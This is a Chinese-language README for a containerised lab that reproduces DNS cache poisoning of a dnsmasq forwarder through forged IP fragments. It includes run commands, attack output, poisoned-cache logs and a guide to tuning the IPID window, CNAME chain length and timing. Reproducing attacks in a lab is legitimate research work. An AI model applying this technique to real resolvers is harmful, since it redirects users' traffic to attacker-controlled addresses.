# Poison Over Forwarders
## 环境搭建
```shell
    docker compose up --build
```
## 实验复现
- 尝试一次注入投毒（由于`auth`和`attacker`默认IPID为1，所以一般直接就能成功）
  ```shell
    docker compose exec -it attacker python3 attack.py

    [*] Attack log file '/logs/attack_log.txt' has been cleared.
    --- Starting FULLY AUTOMATED Self-Calibrating Attack via Shared Volume ---
    [*] DNS Payload Slice Offset correctly calculated to: 1472
    [*] Process pool size: 32.

    ==================================================
    --- Attack Cycle 1 ---
    [*] Triggering attack with query: '5b4c3bfd.example.com'...
    -----------------------
    [INFO] qname: 5b4c3bfd.example.com
    [INFO] prefix: c
    [INFO] victim: example.com
    [INFO] victim ip: 1.1.1.1
    [INFO] attacker: victim.cn
    [INFO] fake ip: 9.9.9.9
    [INFO] cname chain: 55
    -----------------------
    [WARN] length not equal!!!
    [INFO] byte1: 1046 bytes
    [INFO] byte2: 1030 bytes
    [INFO] the subdomain is xxxxxxxxx
    [INFO] length equal
    [WARN] checknum not equal!!!
    [INFO] byte1: 7899220
    [INFO] byte2: 8023094
    [INFO] the pos is (2, 1)
    [INFO] the new subdomain is 000000Fxx
    [INFO] check: 
    [INFO] check pass!!!
    [INFO] terminated
    [INFO] final check: 
    [INFO] final check pass!!!
    [*] Poisoned fragment payload created for this cycle (size: 1046 bytes).

    [+] >>> SUCCESS! <<< Cache for 'victim.cn' POISONED with '9.9.9.9'.
  ```
  ```shell
    # forwarder log    
    dnsmasq[1]: query[A] 5b4c3bfd.example.com from 10.0.0.4
    dnsmasq[1]: forwarded 5b4c3bfd.example.com to 10.0.0.3
    dnsmasq[1]: reply 5b4c3bfd.example.com is <CNAME>
    dnsmasq[1]: reply c0.example.com is <CNAME>
    dnsmasq[1]: reply c1.example.com is <CNAME>
    dnsmasq[1]: reply c2.example.com is <CNAME>
    dnsmasq[1]: reply c3.example.com is <CNAME>
    dnsmasq[1]: reply c4.example.com is <CNAME>
    dnsmasq[1]: reply c5.example.com is <CNAME>
    dnsmasq[1]: reply c6.example.com is <CNAME>
    dnsmasq[1]: reply c7.example.com is <CNAME>
    dnsmasq[1]: reply c8.example.com is <CNAME>
    dnsmasq[1]: reply c9.example.com is <CNAME>
    dnsmasq[1]: reply c10.example.com is <CNAME>
    dnsmasq[1]: reply c11.example.com is <CNAME>
    dnsmasq[1]: reply c12.example.com is <CNAME>
    dnsmasq[1]: reply c13.example.com is <CNAME>
    dnsmasq[1]: reply c14.example.com is <CNAME>
    dnsmasq[1]: reply c15.example.com is <CNAME>
    dnsmasq[1]: reply c16.example.com is <CNAME>
    dnsmasq[1]: reply c17.example.com is <CNAME>
    dnsmasq[1]: reply c18.example.com is <CNAME>
    dnsmasq[1]: reply c19.example.com is <CNAME>
    dnsmasq[1]: reply c20.example.com is <CNAME>
    dnsmasq[1]: reply c21.example.com is <CNAME>
    dnsmasq[1]: reply c22.example.com is <CNAME>
    dnsmasq[1]: reply c23.example.com is <CNAME>
    dnsmasq[1]: reply c24.example.com is <CNAME>
    dnsmasq[1]: reply c25.example.com is <CNAME>
    dnsmasq[1]: reply c26.example.com is <CNAME>
    dnsmasq[1]: reply c27.example.com is <CNAME>
    dnsmasq[1]: reply c28.example.com is <CNAME>
    dnsmasq[1]: reply c29.example.com is <CNAME>
    dnsmasq[1]: reply c30.example.com is <CNAME>
    dnsmasq[1]: reply c31.example.com is <CNAME>
    dnsmasq[1]: reply c32.example.com is <CNAME>
    dnsmasq[1]: reply c33.example.com is <CNAME>
    dnsmasq[1]: reply c34.example.com is <CNAME>
    dnsmasq[1]: reply c35.example.com is <CNAME>
    dnsmasq[1]: reply c36.example.com is <CNAME>
    dnsmasq[1]: reply c37.example.com is <CNAME>
    dnsmasq[1]: reply c38.example.com is <CNAME>
    dnsmasq[1]: reply c39.example.com is <CNAME>
    dnsmasq[1]: reply c40.example.com is <CNAME>
    dnsmasq[1]: reply c41.example.com is <CNAME>
    dnsmasq[1]: reply c42.example.com is <CNAME>
    dnsmasq[1]: reply c43.example.com is <CNAME>
    dnsmasq[1]: reply c44.example.com is <CNAME>
    dnsmasq[1]: reply c45.example.com is <CNAME>
    dnsmasq[1]: reply c46.example.com is <CNAME>
    dnsmasq[1]: reply c47.example.com is <CNAME>
    dnsmasq[1]: reply c48.example.com is <CNAME>
    dnsmasq[1]: reply c49.example.com is <CNAME>
    dnsmasq[1]: reply c50.example.com is <CNAME>
    dnsmasq[1]: reply c51.example.com is <CNAME>
    dnsmasq[1]: reply c52.example.com is <CNAME>
    dnsmasq[1]: reply c53.example.com is <CNAME>
    dnsmasq[1]: reply 000000Fxx.example.com is <CNAME>
    dnsmasq[1]: reply victim.cn is 9.9.9.9
  ```
- 尝试访问`victim.cn`观察是否投毒成功
  ```shell
    docker compose exec -it attacker dig @10.0.0.2 victim.cn

    ; <<>> DiG 9.18.33-1~deb12u2-Debian <<>> @10.0.0.2 victim.cn
    ; (1 server found)
    ;; global options: +cmd
    ;; Got answer:
    ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 63430
    ;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

    ;; OPT PSEUDOSECTION:
    ; EDNS: version: 0, flags:; udp: 4096
    ;; QUESTION SECTION:
    ;victim.cn.                     IN      A

    ;; ANSWER SECTION:
    victim.cn.              3152    IN      A       9.9.9.9

    ;; Query time: 0 msec
    ;; SERVER: 10.0.0.2#53(10.0.0.2) (UDP)
    ;; WHEN: Tue Aug 05 09:58:29 UTC 2025
    ;; MSG SIZE  rcvd: 54
  ```
  ```shell
    # forwarder log
    dnsmasq[1]: query[A] victim.cn from 10.0.0.4
    dnsmasq[1]: cached victim.cn is 9.9.9.9
  ```

## 关键参数
实验环境将大量复杂的参数集成在`attacker/contents/attack.py`与`auth/contents/frag-server.py`中

### `ATTACKER`
#### 投毒配置
*   `ATTACKER`:
    *   默认值: `b'victim.cn'`
    *   说明: 攻击者真正想要投毒的域名，成功后，查询这个域名会得到 `ATTACKER_IP`
    *   **注意**: 由于**修复UDP校验和的逻辑较简单**，该值目前仅能支持比`example.com`要小的域名，子域名长度最好在**3**以下(例如`acc.net`)，如果无法构造UDP包`attack`会报出明显错误
*   `ATTACKER_IP`:
    *   默认值: `'9.9.9.9'`
    *   说明: 想要注入到缓存中的恶意IP地址
    *   **注意**: 同上，值最好不要过大，同理可以看报错，如无报错，则可正常使用
*   `ORIGIN_IP`:
    *   默认值: `'1.1.1.1'`
    *   说明: 原始的、无害的IP地址，**必须与`AUTH`的返回IP一致**

#### DNS配置
*   `CHAIN_LENGTH`:
    *   默认值: `55`
    *   说明: CNAME链的长度，直接影响DNS响应包的大小。必须足够大以确保IP分片, 此值需要与 `AUTH` 中的设置保持一致，**一定不能超过两个分片**
*   `CHAIN_PREFIX`:
    *   默认值: `b'c'`
    *   说明: CNAME链中子域名的前缀，例如 `c0.example.com`。需与 `AUTH` 保持一致

#### IPID配置(如果`AUTH`的IPID逻辑调整为随机化)
*   `IPID_SAMPLE_SIZE`:
    *   默认值: `1`
    *   说明: 在每个攻击周期中，发送的伪造数据包数量。增加此值会提高单次攻击的成功率，但也会增加网络流量。
*   `WINDOW_BEHIND`:
    *   默认值: `100`
    *   说明: IPID猜测窗口增加的下限。从最后一次观察到的IPID值**最少增加**多少个数字开始猜测。
*   `WINDOW_AHEAD`:
    *   默认值: `600`
    *   说明: IPID猜测窗口增加的上限。从最后一次观察到的IPID值**最多增加**多少个数字停止猜测。这个窗口 `[base_ipid + WINDOW_BEHIND, base_ipid + WINDOW_AHEAD]` 定义了IPID的猜测范围。

#### 时序配置
*   `CYCLE_DELAY_SECONDS`:
    *   默认值: `0`
    *   说明: 每个攻击周期之间的延迟（秒）
*   `VERIFICATION_DELAY_SECONDS`:
    *   默认值: `1`
    *   说明: 发送攻击包后，等待多久再进行成功验证。这个时间需要足够长，以确保合法的响应有机会到达并被处理

#### 日志配置(如果`AUTH`的IPID逻辑调整为随机化)
*   `ATTACK_LOG_FILE`:
    *   默认值: `"/logs/attack_log.txt"`
    *   说明: 记录本攻击脚本运行日志的文件路径
*   `AUTH_LOG_PATH`:
    *   默认值: `"/logs/ipid_log.txt"`
    *   说明: 用于读取由 `AUTH` 记录的IPID日志的文件路径。这是两个容器间通信的关键

---

### `AUTH`
`frag-server.py`脚本模拟一个权威DNS服务器，它会返回超大的、经过分片的DNS响应，**并记录下发出包的IPID**

#### IPID
```python
full_packet = IP(dst=dest_ip) / UDP(sport=PORT, dport=dest_port) / Raw(load=response_bytes)
```
- 该部分IPID默认为`1`，如需修改，自行增加随机值即可

#### 网络配置
*   `HOST` / `PORT`:
    *   默认值: `'0.0.0.0'` / `53`
    *   说明: 服务器监听的地址和端口。
*   `ATTACKER_DOMAIN`:
    *   默认值: `b'example.com'`
    *   说明: 此服务器作为哪个域名的权威服务器。此值必须与 `attack.py` 中的 `VICTIM` 域名完全匹配

#### IP分片配置
*   `CHAIN_LENGTH` / `CHAIN_PREFIX`:
    *   默认值: `55` / `b'c'`
    *   说明: 用于构建超大响应的CNAME链长度和前缀。必须与 `attack.py` 中的设置完全一致。
*   `MTU`:
    *   默认值: `1500`
    *   说明: 最大传输单元。Scapy的 `fragment` 函数会基于此值（减去IP头长度）来决定如何分片。
*   `RESPONSE_DELAY_SECONDS`:
    *   默认值: `0`
    *   说明: 在发送第一个分片之前的延迟（秒）。设置一个小的延迟可以给攻击者发送的伪造分片留出时间窗口。
*   `INTER_FRAGMENT_DELAY_MS`:
    *   默认值: `1000`
    *   说明: 发送第一个分片和第二个分片之间的延迟（毫秒）。这个延迟会影响上游解析器IPID的增长，是攻击成功的关键可调参数之一。
